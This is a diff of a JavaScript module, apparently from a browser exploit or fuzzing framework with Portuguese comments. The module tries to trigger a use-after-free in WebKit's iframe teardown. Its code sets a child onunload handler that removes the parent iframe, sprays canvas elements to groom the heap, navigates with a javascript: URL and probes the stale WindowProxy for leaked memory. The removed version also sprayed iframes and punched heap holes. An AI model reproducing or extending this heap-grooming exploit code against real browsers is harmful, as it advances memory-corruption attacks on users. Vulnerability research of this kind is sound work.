@@ -1,75 +1,80 @@
-import { GCOracle } from '../mod_executor.js';
 import { Groomer } from '../mod_groomer.js';
 
 export default {
-    id:       'IFRAME_DOCWRITE_FRAME_UAF',
-    category: 'DOM',
-    risk:     'HIGH',
+    id:       'IFRAME_NAVIGATION_TEARDOWN_UAF',
+    category: 'Exploit',
+    risk:     'CRITICAL',
     description:
-        'document.write() e navigate forçam teardown do Frame nativo. ' +
-        'Refs JS para oldDoc/oldWin retidas pré-teardown acessam Frame freed.',
+        'UAF no FrameLoader C++. Inicia uma navegação de iframe. O evento onunload do filho ' +
+        'destrói o elemento <iframe> pai do DOM principal síncronamente. A transição de estado ' +
+        'perde a referência do Document e liberta o DOMWindow, mas o JS retém a WindowProxy.',
 
-    setup: async function() {
+    setup: function() {
+        this.results = {};
+        this.sandbox = document.getElementById('groomer-sandbox');
+        
         this.iframe = document.createElement('iframe');
-        this.iframe.style.cssText = 'width:200px;height:100px;position:absolute;top:0;left:0';
-        document.body.appendChild(this.iframe);
+        this.iframe.src = 'about:blank';
+        this.sandbox.appendChild(this.iframe);
+        
+        // Guardamos as referências do mundo que vai ser destruído
+        this.ghostWin = this.iframe.contentWindow;
+        this.ghostDoc = this.ghostWin.document;
+        
+        const self = this;
+        
+        // A ARMADILHA: Quando o WebKit tentar navegar, nós destruímos a pista de aterragem
+        this.ghostWin.onunload = function() {
+            try {
+                // Removemos o IFrame da Main Thread a partir do evento de Unload do filho
+                self.iframe.remove();
+                
+                // Forçamos o WebCore a alocar lixo em cima do Frame antigo
+                let trash = Groomer.sprayDOM('canvas', 100);
+            } catch(e) {}
+        };
+    },
 
-        await new Promise(resolve => {
-            if (this.iframe.contentDocument?.readyState === 'complete') return resolve();
-            this.iframe.addEventListener('load', resolve, { once: true });
-            this.iframe.src = 'about:blank';
-        });
-
-        this.oldWin = this.iframe.contentWindow;
-        this.oldDoc = this.iframe.contentDocument;
-
+    trigger: function() {
         try {
-            this.oldDoc.body.innerHTML = '<div id="orig">original</div><span>test</span>';
-            this.origEl = this.oldDoc.getElementById('orig');
-        } catch(e) {}
-
-        // 🚨 Oráculo: Alvo = IFrame e o Document antigo
-        if (GCOracle.registry) {
-            GCOracle.registry.register(this.iframe, `${this.id}_target`);
-            GCOracle.registry.register(this.oldDoc, `${this.id}_target_doc`);
+            // O GATILHO: Dispara o processo brutal de Frame Teardown no C++
+            this.iframe.src = 'javascript:"<html><body></body></html>"';
+        } catch(e) {
+            this.results.error = e.message;
         }
     },
 
-    trigger: async function() {
-        try {
-            this.oldDoc.open('text/html', 'replace');
-            this.oldDoc.write('<!DOCTYPE html><html><head><meta charset="UTF-8"></head>'
-                + '<body><p id="new">REWRITTEN</p></body></html>');
-            this.oldDoc.close();
-        } catch(e) {}
-
-        await new Promise(r => setTimeout(r, 20));
-
-        this.iframe.src = 'about:blank#fuzztarget';
-        this.iframe.remove(); 
-
-        // 🚨 Grooming Massivo: O IFrame FrameLoader é enorme na RAM.
-        // Vamos alocar centenas de iframes falsos e esburacá-los.
-        let nodes = Groomer.sprayDOM('iframe', 200);
-        Groomer.punchHoles(nodes, 2);
-
-        await new Promise(r => setTimeout(r, 30));
-    },
-
     probe: [
-        s => s.oldDoc.readyState,
-        s => s.oldDoc.URL,
-        s => s.oldDoc.body?.innerHTML,
-        s => s.oldDoc.getElementById?.('new'),       
-        s => s.oldDoc.getElementById?.('orig'),      
-        s => s.oldWin.location?.href,
-        s => s.oldWin.history?.length,
-        s => s.oldWin.document === s.iframe.contentDocument,
-        s => s.origEl?.isConnected,
-        s => s.origEl?.ownerDocument === s.oldDoc,
+        // Probe 0: O GhostDoc percebeu que foi desligado do mundo?
+        s => {
+            try {
+                return s.ghostDoc.URL || 'Unreachable';
+            } catch(e) { return 'Safe Exception'; }
+        },
+        
+        // Probe 1: O WindowProxy ainda fala com o C++ morto? (Leak de Ponteiro)
+        s => {
+            try {
+                // Tentamos aceder a um objeto C++ profundo através da janela morta
+                let nav = s.ghostWin.navigator;
+                let cores = nav.hardwareConcurrency;
+                
+                // Se devolver um número gigantesco em vez da quantidade de núcleos (ex: 8), temos UAF!
+                if (typeof cores === 'number' && cores > 64) {
+                    return cores; // Dispara STALE DATA
+                }
+                return 0; // Seguro (ou retornou undefined)
+            } catch(e) {
+                return 0; // Exceção de segurança gerada pelo WebKit (Cross-Origin ou Freed)
+            }
+        }
     ],
 
     cleanup: function() {
-        try { this.iframe.remove(); } catch(e) {}
+        try { this.iframe.remove(); } catch(e){}
+        this.iframe = null;
+        this.ghostWin = null;
+        this.ghostDoc = null;
+        this.results = {};
     }
 };
